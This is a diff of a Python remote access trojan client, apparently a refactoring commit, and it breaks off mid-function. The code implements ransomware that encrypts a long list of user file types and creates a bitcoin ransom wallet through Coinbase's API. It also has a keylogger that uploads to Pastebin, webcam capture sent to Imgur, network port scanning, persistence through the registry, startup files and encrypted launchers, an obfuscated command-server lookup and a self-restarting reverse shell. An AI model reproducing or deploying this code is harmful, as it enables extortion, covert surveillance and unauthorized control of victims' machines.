@@ -112,55 +112,14 @@ class Client(object):
 
 
     def __init__(self, **kwargs):
-        self._jobs          = {}
-        self._results       = {}
-        self._port_scans = {}
-        self._session       = {'connection': threading.Event(), 'prompt': threading.Event()}
-        self._services      = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
-        self._info          = {k:v for k,v in zip(['id', 'ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'device', 'encryption'], [Client._get_client_id(), Client._get_public_ip(), Client._get_local_ip(), sys.platform, Client._get_mac_address(), Client._get_architecture(), Client._get_username(), Client._get_if_admin(), Client._get_device_name(), Client._get_cipher()])}
-        self._commands      = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(vars(Client)[cmd], 'command')}
-        self._setup         = [setattr(self, '__{}__'.format(x), kwargs.get(x)) for x in kwargs]; True
-
-
-    @staticmethod
-    def _configure(target, **kwargs):
-        if hasattr(Client, target):
-            for k,v in kwargs.items():
-                try:
-                    setattr(getattr(Client, target), k, v)
-                except Exception as e:
-                    Client.debug("{} returned error: {}".format(Client._configure.func_name, str(e)))
-
-
-    @staticmethod
-    def _post(url, headers={}, data={}):
-        try:
-            dat = urllib.urlencode(data)
-            req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
-            for key, value in headers.items():
-                req.headers[key] = value
-            return urllib2.urlopen(req).read()
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._post.func_name, str(e)))
-
-
-    @staticmethod
-    def _obfuscate(data):
-        try:
-            a = bytearray(reversed(bytes(data)))
-            b = Client._get_nth_prime(len(a) + 1)
-            c = Client._get_primes(b)
-            return base64.b64encode("".join([(chr(a.pop()) if n in c else os.urandom(1)) for n in xrange(b)]))
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._obfuscate.func_name, str(e)))
-
-
-    @staticmethod
-    def _deobfuscate(block):
-        try:
-            return bytes().join(chr(bytearray(base64.b64decode(bytes(block)))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(bytes(block))))))
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._deobfuscate.func_name, str(e)))
+        self._jobs      = {}
+        self._results   = {}
+        self._networks  = {}
+        self._session   = {'connection': threading.Event(), 'prompt': threading.Event()}
+        self._services  = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
+        self._info      = {k:v for k,v in zip(['id', 'ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'device', 'encryption'], [Client._get_client_id(), Client._get_public_ip(), Client._get_local_ip(), sys.platform, Client._get_mac_address(), Client._get_architecture(), Client._get_username(), Client._get_if_admin(), Client._get_device_name(), Client._get_cipher()])}
+        self._commands  = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(vars(Client)[cmd], 'command')}
+        self._setup     = [setattr(self, '__{}__'.format(x), kwargs.get(x)) for x in kwargs]; True
 
 
     @staticmethod
@@ -180,9 +139,9 @@ class Client(object):
 
 
     @staticmethod
-    def _get_padded(s, block_size):
+    def _get_padded(s, block_size, padding=chr(0)):
         try:
-            return bytes(s) + (block_size - len(bytes(s)) % block_size) * chr(0)
+            return bytes(s) + (int(block_size) - len(bytes(s)) % int(block_size)) * bytes(padding)
         except Exception as e:
             Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
 
@@ -194,13 +153,6 @@ class Client(object):
         except Exception as e:
             Client.debug("{} returned error: {}".format(Client._get_blocks.func_name, str(e)))
 
-
-    @staticmethod
-    def _get_config(x):
-        try:
-            return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
 
     @staticmethod
     def _get_primes(n):
@@ -219,6 +171,25 @@ class Client(object):
             return (Client._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(Client._get_primes(i)) == p).next()     
         except Exception as e:
             Client.debug("{} returned error: {}".format(Client._get_nth_prime.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_obfuscated(data):
+        try:
+            a = bytearray(reversed(bytes(data)))
+            b = Client._get_nth_prime(len(a) + 1)
+            c = Client._get_primes(b)
+            return base64.b64encode("".join([(chr(a.pop()) if n in c else os.urandom(1)) for n in xrange(b)]))
+        except Exception as e:
+            Client.debug("{} returned error: {}".format(Client._get_obfuscated.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_deobfuscated(block):
+        try:
+            return bytes().join(chr(bytearray(base64.b64decode(bytes(block)))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(bytes(block))))))
+        except Exception as e:
+            Client.debug("{} returned error: {}".format(Client._get_deobfuscated.func_name, str(e)))
 
 
     @staticmethod
@@ -294,6 +265,22 @@ class Client(object):
             Client.debug("{} returned error: {}".format(Client._get_if_admin.func_name, str(e)))      
 
 
+    @staticmethod
+    def _get_random_var(x=6):
+        try:
+            return str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(x)))
+        except Exception as e:
+            Client.debug("{} returned error: {}".format(Client._get_nth_prime.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_config(x):
+        try:
+            return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
+        except Exception as e:
+            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+
+
     @staticmethod            
     def _get_job_status(c):
         try:
@@ -306,25 +293,28 @@ class Client(object):
         except Exception as e:
             Client.debug("{} returned error: {}".format(Client._get_job_status.func_name, str(e)))
 
-    def _get_new_wallet(self):
+            
+    @staticmethod
+    def _get_post_request(url, headers={}, data={}):
         try:
-            api_key     = getattr(Client._ransom_payment, 'api_key')
-            api_secret  = getattr(Client._ransom_payment, 'api_secret')
-            api_version = getattr(Client._ransom_payment, 'api_version')
-            account_id  = getattr(Client._ransom_payment, 'account_id')
-            timestamp   = bytes(int(time.time()))
-            name        = bytes(self._session.get('id'))
-            url         = bytes('https://api.coinbase.com/v2/accounts/{}/addresses'.format(account_id))
-            data        = bytes(urllib.urlencode({'name': name}))
-            path        = bytes(urllib2.urlparse.urlparse(url)[2])
-            message     = bytes(timestamp + 'POST' + path + data)
-            signature   = bytes(HMAC.new(api_secret, msg=message, digestmod=SHA256).hexdigest())
-            request     = urllib2.Request(url, data=data)
-            request.headers.update({'Content-Type': 'application/json','CB-VERSION': api_version,'CB-ACCESS-KEY': api_key,'CB-ACCESS-SIGN': signature,'CB-ACCESS-TIMESTAMP': timestamp})
-            return json.loads(urllib2.urlopen(request).read())['data']['address'].encode()
+            dat = urllib.urlencode(data)
+            req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
+            for key, value in headers.items():
+                req.headers[key] = value
+            return urllib2.urlopen(req).read()
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_new_wallet.func_name, str(e)))
+            Client.debug("{} returned error: {}".format(Client._get_post_request.func_name, str(e)))
 
+
+    @staticmethod
+    def _get_new_option(target, **kwargs):
+        if hasattr(Client, target):
+            for k,v in kwargs.items():
+                try:
+                    setattr(getattr(Client, target), k, v)
+                except Exception as e:
+                    Client.debug("{} returned error: {}".format(Client._get_new_option.func_name, str(e)))
+                    
 
     @staticmethod
     def _get_data(source):
@@ -398,7 +388,7 @@ class Client(object):
 
     @staticmethod
     @config(api_key=None, endpoint=None)
-    def _get_server():
+    def _get_remote_server():
         try:
             url = Client._get_config(endpoint)
             if url.startswith('http'):
@@ -410,11 +400,11 @@ class Client(object):
                 if Client._get_if_ipv4(ip):
                     return ip
                 else:
-                    Client.debug("{} returned invalid IPv4 address: '{}'".format(Client._get_server.func_name, str(ip)))
+                    Client.debug("{} returned invalid IPv4 address: '{}'".format(Client._get_remote_server.func_name, str(ip)))
             else:
                 Client.debug("Error: invalid API endpoint: '{}'".format(str(endpoint)))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_server.func_name, str(e)))
+            Client.debug("{} returned error: {}".format(Client._get_remote_server.func_name, str(e)))
         return socket.gethostbyname(socket.gethostname())
 
 
@@ -500,7 +490,7 @@ class Client(object):
     def _upload_imgur(source):
         try:
             data = Client._get_data(source)
-            return json.loads(Client._post('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
+            return json.loads(Client._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
         except Exception as e2:
             Client.debug("{} returned error: {}".format(Client._upload_imgur.func_name, str(e2)))
 
@@ -513,7 +503,7 @@ class Client(object):
             info = {'api_option': 'paste', 'api_paste_code': data}
             info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
             info.update({'api_dev_key' : Client._upload_pastebin.api_dev_key}) if hasattr(Client._upload_pastebin, 'api_dev_key') else None
-            paste = Client._post('https://pastebin.com/api/api_post.php', data=info)
+            paste = Client._get_post_request('https://pastebin.com/api/api_post.php', data=info)
             return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
         except Exception as e:
             Client.debug('{} error: {}'.format(Client._upload_pastebin.func_name, str(e)))
@@ -557,9 +547,9 @@ class Client(object):
 
     @staticmethod
     @config(account_id=None, api_key=None, api_secret=None, wallet_address=None)
-    def _ransom_payment(session_id):
+    def _ransom_payment():
         try:
-            Client._ransom_payment.wallet_address = Client._get_new_btc_address(session_id)
+            Client._ransom_payment.wallet_address = Client._get_new_wallet()
             Client.debug("Bitcoin wallet address: {}".format(Client._ransom_payment.wallet_address))
         except Exception as e:
             Client.debug("{} returned error: {}".format(Client._ransom_payment.func_name, str(e)))
@@ -567,34 +557,34 @@ class Client(object):
 
     def _ransom_encrypt(self, args):
         try:
-            path, sock  = args
-            if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp']:
-                aes_key = SHA256.new(os.urandom(16)).hexdigest()
-                ransom  = self.encrypt(path, key=aes_key)
-                cipher  = PKCS1_OAEP.new(self._session['public_key'])
-                key     = base64.b64encode(cipher.encrypt(aes_key))
-                task_id = self._get_task_id(self.ransom.func_name)
-                data    = {'file': path.replace('/', '?').replace('\\', '?'), 'key': key}
-                task    = {'id': task_id, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': self.ransom.func_name, 'data': data}
-                sock.sendall(self._encrypt(json.dumps(task)) + '\n')
-                if not len([job for job in self._jobs if self.ransom.func_name in job]):
-                    self._debug("Starting new thread for ransom encryption...")
-                    self._jobs[self._ransom_encrypt.func_name] = threading.Thread(target=self._task_threader, name=time.time())
-                    self._jobs[self._ransom_encrypt.func_name].daemon = True
-                    self._jobs[self._ransom_encrypt.func_name].start()
+            if 'public_key' in self._session:
+                path, sock  = args
+                if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp']:
+                    aes_key = SHA256.new(os.urandom(16)).hexdigest()
+                    ransom  = self.encrypt(path, key=aes_key)
+                    cipher  = PKCS1_OAEP.new(self._session['public_key'])
+                    key     = base64.b64encode(cipher.encrypt(aes_key))
+                    task_id = self._get_task_id(self.ransom.func_name)
+                    data    = {'file_path': path.replace('/', '?').replace('\\', '?'), 'aes_key': key}
+                    task    = {'id': task_id, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': self.ransom.func_name, 'data': data}
+                    sock.sendall(self._encrypt(json.dumps(task)) + '\n')
+            else:
+                self.debug("No RSA Public Key found")
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._ransom_decrypt.func_name, str(e)))
+            self.debug("{} returned error: {}".format(self._ransom_encrypt.func_name, str(e)))
 
 
-    def _ransom_decrypt(self, path):
+    def _ransom_decrypt(self, task):
         try:
             if 'private_key' in self._session:
-                path    = task['file'].replace('?', '/')
+                path    = task['data']['file_path'].replace('?', '/')
                 cipher  = PKCS1_OAEP.new(self._session['private_key'])
-                aes_key = cipher.decrypt(base64.b64decode(task['data']['key']))
+                aes_key = cipher.decrypt(base64.b64decode(task['data']['aes_key']))
                 path    = self.decrypt(path, key=aes_key)
                 remove  = self._results.pop(task_id, None)
                 self.debug("Successfully restored {}".format(path))
+            else:
+                self.debug("No RSA Private Key found")
         except Exception as e:
             self.debug("{} returned error: {}".format(self._ransom_decrypt.func_name, str(e)))
                 
@@ -614,14 +604,14 @@ class Client(object):
                 break
 
 
-    def _keylogger_manager(self):
+    def _keylogger_manager(self, *args, **kwargs):
         try:
             while True:
                 if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
-                    result  = self._upload_ftp(self.keylogger.buffer, filetype='.txt') if 'ftp' in args else self._upload_pastebin(self.keylogger.buffer)
+                    result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                     task_id = self._get_task_id(self.keylogger.func_name)
                     task    = {'id': task_id, 'session_id': self._session['id'], 'client_id': self._info['id'], 'task': self.keylogger.func_name, 'data': result}
-                    self._results[task_id] = task
+                    self._results[time.ctime()] = task
                     self.keylogger.buffer.reset()
                     self._tasks.put_nowait((self._report, task))
                 else:
@@ -654,7 +644,7 @@ class Client(object):
     def _scan_ping(self, host):
         try:
             if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
-                self._port_scans[host] = {}
+                self._networks[host] = {}
                 return True
             else:
                 return False
@@ -675,7 +665,7 @@ class Client(object):
                 info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...'), 'state': 'open'}}
             else:
                 info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
-            self._port_scans.get(host).update(info)
+            self._networks.get(host).update(info)
         except (socket.error, socket.timeout):
             pass
         except Exception as e:
@@ -691,14 +681,13 @@ class Client(object):
                     self._jobs['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                     self._jobs['scanner-%d' % x].daemon = True
                     self._jobs['scanner-%d' % x].start()
-                self._task_monitor.flag.clear()
+                self._task_manager.flag.clear()
                 for x in xrange(10):
                     if self._jobs['scanner-%d' % x].is_alive():
                         self._jobs['scanner-%d' % x].join()
-                self._task_monitor.flag.set()
-            return json.dumps(self._port_scans)
+                self._task_manager.flag.set()
+            return json.dumps(self._networks)
         except Exception as e:
-            self.debug('{} error: {}'.format(self._scan_host.func_name, str(e)))
             return '{} error: {}'.format(self._scan_host.func_name, str(e))
 
 
@@ -722,9 +711,8 @@ class Client(object):
                 self._jobs['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                 self._jobs['scanner-%d' % x].start()
             self._jobs['scanner-%d' % x].join()
-            return json.dumps(self._port_scans)
+            return json.dumps(self._networks)
         except Exception as e:
-            self.debug('{} error: {}'.format(self._scan_network.func_name, str(e)))
             return '{} error: {}'.format(self._scan_network.func_name, str(e))
 
 
@@ -738,7 +726,7 @@ class Client(object):
             png = self._get_png(f)
             return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
         except Exception as e:
-            self.debug('{} error: {}'.format(self._webcam_image.func_name, str(e)))
+            return '{} error: {}'.format(self._webcam_image.func_name, str(e))
 
 
     def _webcam_video(self, *args, **kwargs):
@@ -760,7 +748,7 @@ class Client(object):
             except: pass
             return result
         except Exception as e:
-            self.debug('{} error: {}'.format(self._webcam_video.func_name, str(e)))
+            return '{} error: {}'.format(self._webcam_video.func_name, str(e))
 
 
     def _webcam_stream(self, port=None, retries=5):
@@ -800,20 +788,19 @@ class Client(object):
                     sock.close()
                 except: pass
         except Exception as e:
-            self.debug('{} error: {}'.format(self._webcam_stream.func_name, str(e)))
             return '{} error: {}'.format(self._webcam_stream.func_name, str(e))
 
 
     @config(platfomrs=['win32','linux2','darwin'])
-    def _persistence_add_encrypted_launcher(self):
+    def _persistence_add_encrypted_launcher(self):        
         try:
             if hasattr(self, '__l__'):
                 output      = []
                 data        = self._get_config(self.__l__).splitlines()
-                b64var      = randVar()
-                aesvar      = randVar()
-                key         = randKey(32)
-                iv          = randKey(16)
+                b64var      = self._get_random_var()
+                aesvar      = self._get_random_var()
+                key         = self._get_random_var(32)
+                iv          = self._get_random_var(16)
                 aes_encrypt = lambda c, s: base64.b64encode(c.encrypt(self._get_padded(s, AES.block_size, '{')))
                 output_file = "launcher_%d.py" % (random.randrange(1000))
                 imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar] 
@@ -1024,7 +1011,7 @@ class Client(object):
                             fp.write(content)
                     return (True, startup_file)
                 except Exception as e:
-                    self.debug('{} returned error: {}'.format(self._persistence_add_startup_file.func_name.strip('_'), str(e)))
+                    self.debug('{} returned error: {}'.format(self._persistence_add_startup_file.func_name[1:], str(e)))
         return (False, None)
 
 
@@ -1057,7 +1044,7 @@ class Client(object):
                     self._get_registry_key(name, value)
                     return (True, name)
                 except Exception as e:
-                    self.debug('{} returned error: {}'.format(self._persistence_add_registry_key.func_name.strip('_'), str(e)))
+                    self.debug('{} returned error: {}'.format(self._persistence_add_registry_key.func_name[1:], str(e)))
         return (False, None)
 
 
@@ -1194,17 +1181,17 @@ class Client(object):
 
 
 
-    def _get_connection(self, host='127.0.0.1', port=1337):
+    def _get_new_connection(self, host='127.0.0.1', port=1337):
         try:
             if '__v__' not in dir(self):
-                host = self._get_server()
+                host = self._get_remote_server()
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5.0)
             s.connect((host, port))
             self._session['connection'].set()
             return s
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._get_connection.func_name, str(e)))
+            self.debug("{} returned error: {}".format(self._get_new_connection.func_name, str(e)))
         self.kill()
         time.sleep(5)
         return self.run() 
@@ -1220,7 +1207,7 @@ class Client(object):
             xB = bytes_to_long(self._session['socket'].recv(256))
             x  = pow(xB, a, p)
             y  = SHA256.new(long_to_bytes(x)).hexdigest()
-            return self._obfuscate(y)
+            return self._get_obfuscated(y)
         except Exception as e:
             self.debug("{} returned error: {}".format(self._get_session_key.func_name, str(e)))
         self.kill()
@@ -1230,13 +1217,13 @@ class Client(object):
 
     def _encrypt(self, data, key=None):
         if not key:
-            key = self._deobfuscate(self._session['key'])
+            key = self._get_deobfuscated(self._session['key'])
         return getattr(self, '_encrypt_{}'.format(self._info['encryption']))(data, key)
 
 
     def _decrypt(self, data, key=None):
         if not key:
-            key = self._deobfuscate(self._session['key'])
+            key = self._get_deobfuscated(self._session['key'])
         return getattr(self, '_decrypt_{}'.format(self._info['encryption']))(data, key)
 
 
@@ -1266,46 +1253,59 @@ class Client(object):
 
 
     @config(flag=threading.Event())
-    def _task_monitor(self):
-        while True:
-            try:
+    def _task_manager(self):
+        try:
+            while True:
                 if not self._abort:
-                    self._task_monitor.flag.wait()
+                    self._task_manager.flag.wait()
                     jobs = self._jobs.items()
                     for task, worker in jobs:
                         if not worker.is_alive():
-                            _ = self._jobs.pop(task, None)
-                            del _
+                            dead = self._jobs.pop(task, None)
+                            del dead
+                            if 'keylogger_manager' in task:
+                                self._jobs['keylogger_manager'] = threading.Thread(target=self._keylogger_manager, name=time.time())
+                                self._jobs['keylogger_manager'].daemon = True
+                                self._jobs['keylogger_manager'].start()
+                            elif 'reverse_tcp_shell' in task:
+                                self._jobs['reverse_tcp_shell'] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+                                self._jobs['reverse_tcp_shell'].start()    
                     time.sleep(1)
                 else:
                     break
-            except Exception as e:
-                self.debug('{} error: {}'.format(self._task_monitor.func_name, str(e)))
-        self.kill()
-        sys.exit()
+            self.kill()
+            sys.exit()
+        except Exception as e:
+            self.debug('{} error: {}'.format(self._task_manager.func_name, str(e)))
             
 
-
     def _task_threader(self):
-        while True:
-            try:
-                method, task = self._tasks.get_nowait()
-                method(task)
-                self._tasks.task_done()
-            except:
-                break
+        try:
+            while True:
+                try:
+                    method, task = self._tasks.get_nowait()
+                    method(task)
+                    self._tasks.task_done()
+                except:
+                    break
+        except Exception as e:
+            self.debug("{} returned error: {}".format(self._task_threader.func_name, str(e)))
 
 
-    def _get_prompt(self):
-        while True:
-            if not self._abort:
-                self._session['prompt'].wait()
-                self._send(**{'id': '0' * 64, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
-                self._session['prompt'].clear()
-            else:
-                break
-        self.kill()
-        sys.exit()
+    def _get_shell_prompt(self):
+        try:
+            while True:
+                if not self._abort:
+                    self._session['prompt'].wait()
+                    self._send(**{'id': '0' * 64, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
+                    self._session['prompt'].clear()
+                else:
+                    break
+            self.kill()
+            return self.run()
+        except Exception as e:
+            self.debug("{} returned error: {}".format(self._get_shell_prompt.func_name, str(e)))
+
             
     def _get_task_id(self, task):
         try:
@@ -1337,7 +1337,7 @@ class Client(object):
             self.debug("{} returned error: {}".format(self._get_session_id, str(e)))
 
 
-    def _get_standby(self):
+    def _get_standby_mode(self):
         try:
             addr = None
             try:
@@ -1356,7 +1356,7 @@ class Client(object):
                     break
             return self.reverse_tcp_shell()
         except Exception as e:
-            return '{} error: {}'.format(self._get_standby.func_name, str(e))
+            return '{} error: {}'.format(self._get_standby_mode.func_name, str(e))
 
 
     def _get_public_key(self):
@@ -1385,6 +1385,26 @@ class Client(object):
         self.kill()
         time.sleep(5)
         return self.run()
+
+
+    def _get_new_wallet(self):
+        try:
+            api_key         = getattr(Client._ransom_payment, 'api_key')
+            api_secret      = getattr(Client._ransom_payment, 'api_secret')
+            api_version     = getattr(Client._ransom_payment, 'api_version')
+            account_id      = getattr(Client._ransom_payment, 'account_id')
+            timestamp       = bytes(int(time.time()))
+            name            = bytes(self._session.get('id'))
+            url             = bytes('https://api.coinbase.com/v2/accounts/{}/addresses'.format(account_id))
+            data            = bytes(urllib.urlencode({'name': name}))
+            path            = bytes(urllib2.urlparse.urlparse(url)[2])
+            message         = bytes(timestamp + 'POST' + path + data)
+            signature       = bytes(HMAC.new(api_secret, msg=message, digestmod=SHA256).hexdigest())
+            request         = urllib2.Request(url, data=data)
+            request.headers = {'Content-Type': 'application/json','CB-VERSION': api_version,'CB-ACCESS-KEY': api_key,'CB-ACCESS-SIGN': signature,'CB-ACCESS-TIMESTAMP': timestamp}
+            return json.loads(urllib2.urlopen(request).read())['data']['address'].encode()
+        except Exception as e:
+            self.debug("{} returned error: {}".format(self._get_new_wallet.func_name, str(e)))
 
 
 
@@ -1475,7 +1495,7 @@ class Client(object):
         show name of present working directory
         """
         try:
-            return '\nPresent working directory:\n\n{}\n'.format(os.getcwd())
+            return '\n\n' + os.getcwd()
         except Exception as e:
             return "{} returned error: '{}'".format(self.pwd.func_name, str(e))
 
@@ -1520,11 +1540,19 @@ class Client(object):
                 val = False
             elif ',' in val:
                 val = val.split(',')
-            try:
-                setattr(getattr(self, target), option, val)
-            except:
-                getattr(self, target).func_dict[option] = val
-            return json.dumps(vars(getattr(self, target)))
+            if hasattr(self, target):
+                try:
+                    setattr(getattr(self, target), option, val)
+                except:
+                    try:
+                        getattr(self, target).func_dict[option] = val
+                    except: pass
+                try:
+                    return json.dumps(vars(getattr(self, target)))
+                except:
+                    return bytes(vars(getattr(self, target)))
+            else:
+                return "Target attribute '{}' not found".format(str(target))
         except Exception as e:
             return "{} returned error: '{}'".format(self.set.func_name, str(e))
 
@@ -1541,7 +1569,7 @@ class Client(object):
             except Exception as e:
                 return "'{}' returned error: '{}'".format(self.wget.func_name, str(e))
         else:
-            return 'Invalid target URL - must begin with http:// or https://'
+            return 'Invalid target URL (must begin with http)'
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
@@ -1564,10 +1592,12 @@ class Client(object):
             self._session['key']         = None
             self._session['socket']      = None
             self._session['public_key']  = None
+            self._session['private_key'] = None
             self._session['connection']  = threading.Event()
         except Exception as e:
             self.debug("{} returned error: {}".format(self.kill.func_name, str(e)))
-        for job in [i for i in self._jobs]:
+        jobs = self._jobs.keys()
+        for job in jobs:
             try:
                 _ = self._jobs.pop(job, None)
                 del _
@@ -1707,7 +1737,7 @@ class Client(object):
         disconnect from server but keep client alive
         """
         try:
-            self._jobs[self.standby.func_name] = threading.Timer(1.0, self._get_standby)            
+            self._jobs[self.standby.func_name] = threading.Timer(1.0, self._get_standby_mode)            
             self._jobs[self.standby.func_name].start()
             return "{} standing by".format(self._info.get('ip'))
         except Exception as e:
@@ -1925,13 +1955,13 @@ class Client(object):
                 self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
                 self._jobs[self.keylogger.func_name].setDaemon(True)
                 self._jobs[self.keylogger.func_name].start()
-                self._jobs[self._keylogger_manager.func_name.strip('_')] = threading.Thread(target=self._keylogger_manager, name=time.time())
-                self._jobs[self._keylogger_manager.func_name.strip('_')].setDaemon(True)
-                self._jobs[self._keylogger_manager.func_name.strip('_')].start()
+                self._jobs[self._keylogger_manager.func_name[1:]] = threading.Thread(target=self._keylogger_manager, name=time.time())
+                self._jobs[self._keylogger_manager.func_name[1:]].setDaemon(True)
+                self._jobs[self._keylogger_manager.func_name[1:]].start()
                 return "Keylogger running"
             else:
-                t1 = float(time.time()) - float(self._jobs[self.keylogger_func_name].name)
-                t2 = float(time.time()) - float(self._jobs[self._keylogger_manager.func_name.strip('_')].name)
+                t1 = float(time.time()) - float(self._jobs[self.keylogger.func_name].name)
+                t2 = float(time.time()) - float(self._jobs[self._keylogger_manager.func_name[1:]].name)
                 return "Keylogger running: {}".format(max(t1, t2))
         elif mode and str(mode) == 'stop':
             if self.keylogger.func_name in self._jobs:
@@ -1940,6 +1970,8 @@ class Client(object):
                          _ = self._jobs.pop(self.keylogger.func_name, None)
                          del _
             return "Keylogger stopped"
+        else:
+            return self.keylogger.usage
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
@@ -1962,37 +1994,35 @@ class Client(object):
         """
         establish persistence to survive reboots
         """
-        if not args:
-            for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
-                target = '_persistence_add_{}'.format(method)
-                if sys.platform in getattr(self, target).platforms:
-                    established, result = getattr(self, target)()
-                    self.persistence.methods[method]['established'] = established
-                    self.persistence.methods[method]['result'] = result
-                else:
-                    self.persistence.methods[method]['established'] = False
-                    self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
-            return json.dumps(self.persistence.methods, indent=2)
-        else:
-            cmd, _, method = str(args).partition(' ')
-            method = method.replace(' ','_') if ' ' in method else method
-            if 'method' in cmd:
